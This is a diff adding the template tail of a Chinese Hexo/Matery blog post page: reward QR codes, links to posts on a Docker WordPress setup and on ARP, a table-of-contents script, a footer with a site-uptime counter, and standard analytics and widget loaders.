+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2019/12/17/WordPress/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="WordPress">
+                        
+                        <span class="card-title">WordPress</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            用Docker搭建WordPress博客
+WordPress是一个非常著名的PHP编写的博客平台，发展到目前为止已经形成了一个庞大的网站平台系统。在WP上有规模庞大的插件和主题，可以帮助我们快速建立一个博客甚至网站。
+在Windows上可以
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2019-12-17
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/12/17/kali%20linux--%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/4.jpg" class="responsive-img" alt="kali linux--中间人攻击">
+                        
+                        <span class="card-title">kali linux--中间人攻击</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            ARP协议ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP/IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。
+基本功能通过目标设备的IP地址，查询目标设备的MAC地址，以保证通信
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-12-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
+                            
+                        </span>
+                    </div>
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">年份</span>
+            <a href="https://hzerui.github.io" target="_blank">John Doe</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    window.setTimeout("siteTime()", 1000);
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2019";
+                    var startMonth = "6";
+                    var startDate = "28";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <!-- Baidu Analytics -->
+
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+    <script>
+        (function (i, s, o, g, r, a, m) {
+            i["DaoVoiceObject"] = r;
+            i[r] = i[r] || function () {
+                (i[r].q = i[r].q || []).push(arguments)
+            }, i[r].l = 1 * new Date();
+            a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+            a.async = 1;
+            a.src = g;
+            a.charset = "utf-8";
+            m.parentNode.insertBefore(a, m)
+        })(window, document, "script", ('https:' == document.location.protocol ? 'https:' : 'http:') +
+            "//widget.daovoice.io/widget/6984b559.js", "daovoice")
+        daovoice('init', {
+            app_id: ""
+        });
+        daovoice('update');
+    </script>
+    
+
+    
+
+    
+
+    
+    <script type="text/javascript" src="/libs/background/ribbon-dynamic.js" async="async"></script>
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
